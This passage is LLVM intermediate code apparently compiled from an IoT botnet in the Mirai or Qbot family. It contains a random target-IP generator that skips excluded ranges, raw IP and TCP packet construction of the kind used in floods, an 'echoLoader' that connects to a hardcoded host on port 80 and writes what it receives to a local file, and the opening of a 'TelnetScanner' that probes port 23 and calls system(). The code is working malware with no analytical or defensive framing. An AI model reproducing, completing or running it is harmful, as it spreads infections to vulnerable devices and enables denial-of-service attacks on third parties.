  %434 = zext i8 %433 to i32
  %435 = icmp eq i32 %434, 110
  br i1 %435, label %436, label %440

; <label>:436:                                    ; preds = %432
  %437 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %438 = zext i8 %437 to i32
  %439 = icmp eq i32 %438, 72
  br i1 %439, label %536, label %440

; <label>:440:                                    ; preds = %436, %432, %428
  %441 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %442 = zext i8 %441 to i32
  %443 = icmp eq i32 %442, 208
  br i1 %443, label %444, label %448

; <label>:444:                                    ; preds = %440
  %445 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %446 = zext i8 %445 to i32
  %447 = icmp eq i32 %446, 67
  br i1 %447, label %536, label %448

; <label>:448:                                    ; preds = %444, %440
  %449 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %450 = zext i8 %449 to i32
  %451 = icmp eq i32 %450, 94
  br i1 %451, label %452, label %460

; <label>:452:                                    ; preds = %448
  %453 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %454 = zext i8 %453 to i32
  %455 = icmp eq i32 %454, 102
  br i1 %455, label %456, label %460

; <label>:456:                                    ; preds = %452
  %457 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %458 = zext i8 %457 to i32
  %459 = icmp eq i32 %458, 48
  br i1 %459, label %536, label %460

; <label>:460:                                    ; preds = %456, %452, %448
  %461 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %462 = zext i8 %461 to i32
  %463 = icmp eq i32 %462, 93
  br i1 %463, label %464, label %472

; <label>:464:                                    ; preds = %460
  %465 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %466 = zext i8 %465 to i32
  %467 = icmp eq i32 %466, 174
  br i1 %467, label %468, label %472

; <label>:468:                                    ; preds = %464
  %469 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %470 = zext i8 %469 to i32
  %471 = icmp eq i32 %470, 88
  br i1 %471, label %536, label %472

; <label>:472:                                    ; preds = %468, %464, %460
  %473 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %474 = zext i8 %473 to i32
  %475 = icmp eq i32 %474, 89
  br i1 %475, label %476, label %484

; <label>:476:                                    ; preds = %472
  %477 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %478 = zext i8 %477 to i32
  %479 = icmp eq i32 %478, 248
  br i1 %479, label %480, label %484

; <label>:480:                                    ; preds = %476
  %481 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %482 = zext i8 %481 to i32
  %483 = icmp eq i32 %482, 174
  br i1 %483, label %536, label %484

; <label>:484:                                    ; preds = %480, %476, %472
  %485 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %486 = zext i8 %485 to i32
  %487 = icmp eq i32 %486, 89
  br i1 %487, label %488, label %496

; <label>:488:                                    ; preds = %484
  %489 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %490 = zext i8 %489 to i32
  %491 = icmp eq i32 %490, 248
  br i1 %491, label %492, label %496

; <label>:492:                                    ; preds = %488
  %493 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %494 = zext i8 %493 to i32
  %495 = icmp eq i32 %494, 172
  br i1 %495, label %536, label %496

; <label>:496:                                    ; preds = %492, %488, %484
  %497 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %498 = zext i8 %497 to i32
  %499 = icmp eq i32 %498, 89
  br i1 %499, label %500, label %508

; <label>:500:                                    ; preds = %496
  %501 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %502 = zext i8 %501 to i32
  %503 = icmp eq i32 %502, 248
  br i1 %503, label %504, label %508

; <label>:504:                                    ; preds = %500
  %505 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %506 = zext i8 %505 to i32
  %507 = icmp eq i32 %506, 170
  br i1 %507, label %536, label %508

; <label>:508:                                    ; preds = %504, %500, %496
  %509 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %510 = zext i8 %509 to i32
  %511 = icmp eq i32 %510, 89
  br i1 %511, label %512, label %520

; <label>:512:                                    ; preds = %508
  %513 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %514 = zext i8 %513 to i32
  %515 = icmp eq i32 %514, 248
  br i1 %515, label %516, label %520

; <label>:516:                                    ; preds = %512
  %517 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %518 = zext i8 %517 to i32
  %519 = icmp eq i32 %518, 169
  br i1 %519, label %536, label %520

; <label>:520:                                    ; preds = %516, %512, %508
  %521 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %522 = zext i8 %521 to i32
  %523 = icmp eq i32 %522, 89
  br i1 %523, label %524, label %532

; <label>:524:                                    ; preds = %520
  %525 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %526 = zext i8 %525 to i32
  %527 = icmp eq i32 %526, 248
  br i1 %527, label %528, label %532

; <label>:528:                                    ; preds = %524
  %529 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %530 = zext i8 %529 to i32
  %531 = icmp eq i32 %530, 160
  br i1 %531, label %536, label %532

; <label>:532:                                    ; preds = %528, %524, %520
  %533 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %534 = zext i8 %533 to i32
  %535 = icmp sge i32 %534, 224
  br label %536

; <label>:536:                                    ; preds = %532, %528, %516, %504, %492, %480, %468, %456, %444, %436, %424, %412, %400, %388, %376, %364, %352, %340, %328, %316, %304, %292, %280, %268, %256, %244, %232, %220, %208, %196, %184, %172, %160, %148, %136, %124, %120, %112, %104, %92, %80, %68, %60, %56, %44, %40
  %537 = phi i1 [ true, %528 ], [ true, %516 ], [ true, %504 ], [ true, %492 ], [ true, %480 ], [ true, %468 ], [ true, %456 ], [ true, %444 ], [ true, %436 ], [ true, %424 ], [ true, %412 ], [ true, %400 ], [ true, %388 ], [ true, %376 ], [ true, %364 ], [ true, %352 ], [ true, %340 ], [ true, %328 ], [ true, %316 ], [ true, %304 ], [ true, %292 ], [ true, %280 ], [ true, %268 ], [ true, %256 ], [ true, %244 ], [ true, %232 ], [ true, %220 ], [ true, %208 ], [ true, %196 ], [ true, %184 ], [ true, %172 ], [ true, %160 ], [ true, %148 ], [ true, %136 ], [ true, %124 ], [ true, %120 ], [ true, %112 ], [ true, %104 ], [ true, %92 ], [ true, %80 ], [ true, %68 ], [ true, %60 ], [ true, %56 ], [ true, %44 ], [ true, %40 ], [ %535, %532 ]
  br i1 %537, label %538, label %551

; <label>:538:                                    ; preds = %536
  %539 = call i32 @rand() #2
  %540 = srem i32 %539, 255
  %541 = trunc i32 %540 to i8
  store i8 %541, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %542 = call i32 @rand() #2
  %543 = srem i32 %542, 255
  %544 = trunc i32 %543 to i8
  store i8 %544, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %545 = call i32 @rand() #2
  %546 = srem i32 %545, 255
  %547 = trunc i32 %546 to i8
  store i8 %547, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %548 = call i32 @rand() #2
  %549 = srem i32 %548, 255
  %550 = trunc i32 %549 to i8
  store i8 %550, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  br label %40

; <label>:551:                                    ; preds = %536
  %552 = bitcast [16 x i8]* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %552, i8 0, i64 16, i32 16, i1 false)
  %553 = getelementptr inbounds [16 x i8], [16 x i8]* %3, i32 0, i32 0
  %554 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %555 = zext i8 %554 to i32
  %556 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %557 = zext i8 %556 to i32
  %558 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %559 = zext i8 %558 to i32
  %560 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %561 = zext i8 %560 to i32
  %562 = call i32 (i8*, i8*, ...) @szprintf(i8* %553, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.46, i32 0, i32 0), i32 %555, i32 %557, i32 %559, i32 %561)
  %563 = getelementptr inbounds [16 x i8], [16 x i8]* %3, i32 0, i32 0
  %564 = call i32 @inet_addr(i8* %563) #2
  store i32 %564, i32* %1, align 4
  br label %565

; <label>:565:                                    ; preds = %551, %11
  %566 = load i32, i32* %1, align 4
  ret i32 %566
}

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #13
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %18

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  %16 = load i32, i32* %4, align 4
  %17 = sub nsw i32 %16, 2
  store i32 %17, i32* %4, align 4
  br label %6

; <label>:18:                                     ; preds = %6
  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 0
  br i1 %20, label %21, label %28

; <label>:21:                                     ; preds = %18
  %22 = load i16*, i16** %3, align 8
  %23 = bitcast i16* %22 to i8*
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i64
  %26 = load i64, i64* %5, align 8
  %27 = add i64 %26, %25
  store i64 %27, i64* %5, align 8
  br label %28

; <label>:28:                                     ; preds = %21, %18
  br label %29

; <label>:29:                                     ; preds = %33, %28
  %30 = load i64, i64* %5, align 8
  %31 = lshr i64 %30, 16
  %32 = icmp ne i64 %31, 0
  br i1 %32, label %33, label %39

; <label>:33:                                     ; preds = %29
  %34 = load i64, i64* %5, align 8
  %35 = and i64 %34, 65535
  %36 = load i64, i64* %5, align 8
  %37 = lshr i64 %36, 16
  %38 = add i64 %35, %37
  store i64 %38, i64* %5, align 8
  br label %29

; <label>:39:                                     ; preds = %29
  %40 = load i64, i64* %5, align 8
  %41 = xor i64 %40, -1
  %42 = trunc i64 %41 to i16
  ret i16 %42
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #2
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #2
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* %2, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i16, align 2
  %5 = alloca %struct.hostent*, align 8
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i16 %1, i16* %4, align 2
  store i32 1, i32* %7, align 4
  %9 = load i8*, i8** %3, align 8
  %10 = call %struct.hostent* @gethostbyname(i8* %9)
  store %struct.hostent* %10, %struct.hostent** %5, align 8
  %11 = icmp eq %struct.hostent* %10, null
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  call void @herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.47, i32 0, i32 0)) #2
  call void @exit(i32 1) #14
  unreachable

; <label>:13:                                     ; preds = %2
  %14 = load %struct.hostent*, %struct.hostent** %5, align 8
  %15 = getelementptr inbounds %struct.hostent, %struct.hostent* %14, i32 0, i32 4
  %16 = load i8**, i8*** %15, align 8
  %17 = getelementptr inbounds i8*, i8** %16, i64 0
  %18 = load i8*, i8** %17, align 8
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %20 = bitcast %struct.in_addr* %19 to i8*
  %21 = load %struct.hostent*, %struct.hostent** %5, align 8
  %22 = getelementptr inbounds %struct.hostent, %struct.hostent* %21, i32 0, i32 3
  %23 = load i32, i32* %22, align 4
  %24 = sext i32 %23 to i64
  call void @bcopy(i8* %18, i8* %20, i64 %24) #2
  %25 = load i16, i16* %4, align 2
  %26 = call zeroext i16 @htons(i16 zeroext %25) #13
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %26, i16* %27, align 2
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = call i32 @socket(i32 2, i32 1, i32 6) #2
  store i32 %29, i32* %8, align 4
  %30 = load i32, i32* %8, align 4
  %31 = bitcast i32* %7 to i8*
  %32 = call i32 @setsockopt(i32 %30, i32 6, i32 1, i8* %31, i32 4) #2
  %33 = load i32, i32* %8, align 4
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %13
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.48, i32 0, i32 0))
  call void @exit(i32 1) #14
  unreachable

; <label>:36:                                     ; preds = %13
  %37 = load i32, i32* %8, align 4
  %38 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %39 = call i32 @connect(i32 %37, %struct.sockaddr* %38, i32 16)
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %36
  call void @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.49, i32 0, i32 0))
  call void @exit(i32 1) #14
  unreachable

; <label>:42:                                     ; preds = %36
  %43 = load i32, i32* %8, align 4
  ret i32 %43
}

declare %struct.hostent* @gethostbyname(i8*) #3

; Function Attrs: nounwind
declare void @herror(i8*) #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #4

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

declare void @perror(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @echoLoader() #0 {
  %1 = alloca [512 x i8], align 16
  %2 = alloca i32, align 4
  %3 = alloca %struct._IO_FILE*, align 8
  %4 = call i32 @socket_connect(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.50, i32 0, i32 0), i16 zeroext 80)
  store i32 %4, i32* %2, align 4
  %5 = load i32, i32* %2, align 4
  %6 = call i64 @write(i32 %5, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.51, i32 0, i32 0), i64 13)
  %7 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %7, i8 0, i64 512, i32 16, i1 false)
  br label %8

; <label>:8:                                      ; preds = %13, %0
  %9 = load i32, i32* %2, align 4
  %10 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i32 0, i32 0
  %11 = call i64 @read(i32 %9, i8* %10, i64 511)
  %12 = icmp ne i64 %11, 0
  br i1 %12, label %13, label %21

; <label>:13:                                     ; preds = %8
  %14 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.53, i32 0, i32 0))
  store %struct._IO_FILE* %14, %struct._IO_FILE** %3, align 8
  %15 = load %struct._IO_FILE*, %struct._IO_FILE** %3, align 8
  %16 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i32 0, i32 0
  %17 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %15, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.54, i32 0, i32 0), i8* %16)
  %18 = load %struct._IO_FILE*, %struct._IO_FILE** %3, align 8
  %19 = call i32 @fclose(%struct._IO_FILE* %18)
  %20 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %20, i8 0, i64 512, i32 16, i1 false)
  br label %8

; <label>:21:                                     ; preds = %8
  %22 = load i32, i32* %2, align 4
  %23 = call i32 @shutdown(i32 %22, i32 2) #2
  %24 = load i32, i32* %2, align 4
  %25 = call i32 @close(i32 %24)
  ret void
}

declare %struct._IO_FILE* @fopen(i8*, i8*) #3

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #3

declare i32 @fclose(%struct._IO_FILE*) #3

; Function Attrs: nounwind
declare i32 @shutdown(i32, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @TelnetScanner() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i8*, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = call i32 @getdtablesize() #2
  %15 = sdiv i32 %14, 4
  %16 = mul nsw i32 %15, 3
  store i32 %16, i32* %1, align 4
  %17 = load i32, i32* %1, align 4
  %18 = icmp sgt i32 %17, 512
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %0
  br label %22

; <label>:20:                                     ; preds = %0
  %21 = load i32, i32* %1, align 4
  br label %22

; <label>:22:                                     ; preds = %20, %19
  %23 = phi i32 [ 512, %19 ], [ %21, %20 ]
  store i32 %23, i32* %1, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = call zeroext i16 @htons(i16 zeroext 23) #13
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %25, i16* %26, align 2
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %28 = getelementptr inbounds [8 x i8], [8 x i8]* %27, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %28, i8 0, i64 8, i32 4, i1 false)
  %29 = load i32, i32* %1, align 4
  %30 = zext i32 %29 to i64
  %31 = call i8* @llvm.stacksave()
  store i8* %31, i8** %9, align 8
  %32 = alloca %struct.telstate_t, i64 %30, align 16
  %33 = bitcast %struct.telstate_t* %32 to i8*
  %34 = load i32, i32* %1, align 4
  %35 = sext i32 %34 to i64
  %36 = mul i64 %35, 5
  call void @llvm.memset.p0i8.i64(i8* %33, i8 0, i64 %36, i32 16, i1 false)
  store i32 0, i32* %2, align 4
  br label %37

; <label>:37:                                     ; preds = %56, %22
  %38 = load i32, i32* %2, align 4
  %39 = load i32, i32* %1, align 4
  %40 = icmp slt i32 %38, %39
  br i1 %40, label %41, label %59

; <label>:41:                                     ; preds = %37
  %42 = load i32, i32* %2, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %43
  %45 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i32 0, i32 3
  store i8 1, i8* %45, align 1
  %46 = call noalias i8* @malloc(i64 1024) #2
  %47 = load i32, i32* %2, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %48
  %50 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i32 0, i32 8
  store i8* %46, i8** %50, align 8
  %51 = load i32, i32* %2, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %52
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %53, i32 0, i32 8
  %55 = load i8*, i8** %54, align 8
  call void @llvm.memset.p0i8.i64(i8* %55, i8 0, i64 1024, i32 1, i1 false)
  br label %56

; <label>:56:                                     ; preds = %41
  %57 = load i32, i32* %2, align 4
  %58 = add nsw i32 %57, 1
  store i32 %58, i32* %2, align 4
  br label %37

; <label>:59:                                     ; preds = %37
  %60 = call i32 @system(i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.55, i32 0, i32 0))
  %61 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 0
  store i64 5, i64* %61, align 8
  %62 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 1
  store i64 0, i64* %62, align 8
  br label %63

; <label>:63:                                     ; preds = %2307, %59
  br label %64

; <label>:64:                                     ; preds = %63
  store i32 0, i32* %2, align 4
  br label %65

; <label>:65:                                     ; preds = %2304, %64
  %66 = load i32, i32* %2, align 4
  %67 = load i32, i32* %1, align 4
  %68 = icmp slt i32 %66, %67
  br i1 %68, label %69, label %2307

